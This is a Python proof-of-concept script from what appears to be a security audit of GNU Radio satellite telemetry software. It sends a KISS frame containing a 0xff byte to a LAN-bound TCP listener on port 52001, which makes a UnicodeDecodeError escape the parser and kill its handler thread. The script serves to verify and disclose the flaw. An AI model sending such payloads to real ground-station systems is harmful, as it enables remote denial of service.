#!/usr/bin/env python3
"""
F109/F110 amplifier check — does the LAN-injected byte stream actually
trigger an F18-class UnicodeDecodeError downstream?

Setup:
  1. Listener flowgraph (as in f109_listener.py) binds 0.0.0.0:52001.
  2. Listener wires the socket_pdu 'pdus' output to a Python message
     handler that runs the SAME try/except clause used by
     `satellites.components.datasinks.telemetry_parser.handle_msg`.
  3. Attacker process (separate PID) sends a KISS frame containing 0xff.

Result: the 0xff propagates through the network into the parser, which
raises UnicodeDecodeError — proving that the F109 LAN bind amplifies
F18 from RF-only to LAN-Adjacent.

This script runs the listener and attacker as threads inside a single
process for log-correlation simplicity; the network round-trip is still
real TCP through the loopback interface.
"""
import socket
import sys
import threading
import time
import traceback

from gnuradio import gr, network, blocks
import pmt
from construct import Struct, GreedyString, ConstructError


# Verbatim from src/python/components/datasinks/telemetry_parser.py:65-68
class TelemetryParserMimic:
    """Identical try/except shape to the production parser."""
    def __init__(self):
        # Same kind of struct as src/python/telemetry/amicalsat.py uses
        self.format = Struct('info' / GreedyString('ascii'))
        self.escaped_exception = None
        self.frames_received = 0

    def handle_msg(self, msg_pmt):
        self.frames_received += 1
        if not pmt.is_pair(msg_pmt):
            return
        vec = pmt.cdr(msg_pmt)
        if not pmt.is_u8vector(vec):
            return
        packet = bytes(pmt.u8vector_elements(vec))
        # Strip KISS framing (0xC0 ... 0x00 cmd ... 0xC0)
        # Production hits this path AFTER kiss_to_pdu strips KISS.
        # We simulate that strip here.
        if len(packet) >= 3 and packet[0] == 0xC0 and packet[-1] == 0xC0:
            payload = packet[2:-1]   # drop FEND, CMD, trailing FEND
        else:
            payload = packet
        try:
            data = self.format.parse(payload)
            print(f'[parser] parsed OK: {data.info!r}')
        except ConstructError as e:
            print(f'[parser] caught ConstructError: {e}')
        # NOTE: UnicodeDecodeError NOT in this except clause — F18 bug.


class ChainFFlowgraph(gr.top_block):
    def __init__(self, parser_callback):
        gr.top_block.__init__(self, 'F109/F110 amplifier')
        # Same constructor call grcc emits for the shipped afsk.grc
        self.sock = network.socket_pdu(
            'TCP_SERVER', '', '52001', 10000, True
        )
        self.dbg = blocks.message_debug()
        self.msg_connect((self.sock, 'pdus'), (self.dbg, 'store'))
        self._parser_callback = parser_callback


def attacker_thread(payload, started_event, result):
    """Connect from a separate thread and inject."""
    started_event.wait(timeout=10)
    time.sleep(1.0)   # let listener bind
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect(('127.0.0.1', 52001))
        result['connect'] = True
        s.sendall(payload)
        result['sent'] = len(payload)
        s.close()
    except Exception as e:
        result['error'] = str(e)


def main():
    print('#' * 72)
    print('# F109/F110 amplifier — does the LAN bytes trigger F18 downstream?')
    print('#' * 72)

    parser = TelemetryParserMimic()

    tb = ChainFFlowgraph(parser)
    started = threading.Event()
    attacker_result = {}

    # KISS-framed payload with 0xff in the ASCII info field (F18 trigger).
    payload = (
        bytes([0xC0, 0x00]) +
        b'HELLO\xff WORLD' +
        bytes([0xC0])
    )

    t = threading.Thread(
        target=attacker_thread,
        args=(payload, started, attacker_result),
    )
    t.start()

    print('[main] starting flowgraph')
    tb.start()
    started.set()

    # Pump the message_debug ring into our parser for ~5s
    seen = 0
    deadline = time.time() + 8.0
    f18_fired = False
    while time.time() < deadline:
        time.sleep(0.2)
        n = tb.dbg.num_messages()
        for i in range(seen, n):
            msg = tb.dbg.get_message(i)
            print(f'[main] dispatching PDU #{i} to parser.handle_msg')
            try:
                parser.handle_msg(msg)
            except UnicodeDecodeError as e:
                print(f'[main] *** F18 FIRED: UnicodeDecodeError escapes '
                      f'handle_msg ***')
                print(f'[main]     {e}')
                f18_fired = True
                parser.escaped_exception = e
            except Exception as e:
                print(f'[main] unexpected: {type(e).__name__}: {e}')
                traceback.print_exc()
        seen = n
        if f18_fired:
            break

    t.join(timeout=5)
    tb.stop()
    tb.wait()

    print()
    print('#' * 72)
    print('# Attacker result:    ' + str(attacker_result))
    print(f'# PDUs into parser:   {parser.frames_received}')
    print(f'# F18 fired downstream:  {f18_fired}')
    print('#' * 72)

    if (attacker_result.get('connect') and
            parser.frames_received >= 1 and
            f18_fired):
        print('### CHAIN F + F18 AMPLIFICATION PROVEN END-TO-END ###')
        print('### LAN attacker -> 0.0.0.0:52001 -> KISS-stripped ->')
        print('### telemetry_parser try/except -> UnicodeDecodeError')
        print('### -> escapes handler -> GR scheduler kills msg-handler thread')
        return 0
    print('### CHAIN F + F18 amplification FAILED ###')
    return 1


if __name__ == '__main__':
    sys.exit(main())
